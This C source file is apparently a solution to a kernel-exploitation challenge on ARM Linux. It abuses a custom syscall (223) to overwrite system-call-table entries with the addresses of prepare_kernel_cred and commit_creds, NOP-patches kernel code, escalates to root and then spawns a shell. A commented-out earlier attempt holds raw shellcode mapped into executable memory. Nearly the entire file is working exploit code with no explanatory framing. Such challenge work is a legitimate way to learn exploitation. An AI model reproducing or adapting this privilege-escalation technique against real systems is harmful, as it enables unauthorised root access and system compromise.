#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>

// note that this is in kernelspace (most significant bit is 1)
#define SYS_CALL_TABLE 0x8000e348
#define SYS_EXIT 1
#define SYS_UNLINK 10

int main() {
    /*
    // OLD exploit (doesn't work cuz shellcode is in userspace?)
    char shellcode[] = "\x00\xf0 \xe3\x01@-\xe9\x00\x00\xa0\xe3\x0c \x9f\xe52\xff/\xe1\x08 \x9f\xe52\xff/\xe1\x01\x80\xbd\xe8$\xf9\x03\x80l\xf5\x03\x80";
    void *sc_addr = mmap((void *)0xdead000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, -1, 0);
    if (sc_addr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
    memcpy(sc_addr, shellcode, sizeof(shellcode));
    // overwrite a SCT entry with address of shellcode
    char* sc = "\x04\xd0\xea\x0d\x00";
    syscall(SYS_UPPER, sc, SYS_CALL_TABLE + SYS_TIME * 4);

    // jump to shellcode
    syscall(SYS_TIME);
    */

    // write &prepare_kernel_cred to SYS_EXIT
    syscall(223, "\x24\xf9\x03\x80\x00", SYS_CALL_TABLE+4*SYS_EXIT);

    // write &commit_creds to SYS_UNLINK
    // this is 12 less than the correct address
    syscall(223, "\x60\xf5\x03\x80\x00", SYS_CALL_TABLE+4*SYS_UNLINK);

    // write 12 bytes of nops (mov r1, r1)
    syscall(223, "\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x00", 0x8003f560);

    // elevate privileges
    syscall(SYS_UNLINK, syscall(SYS_EXIT, 0));

    // launch a shell
    char* argv[] = { NULL };
    char* envp[] = { NULL };
    printf("here\n");
    system("/bin/sh");

    return 0;
}
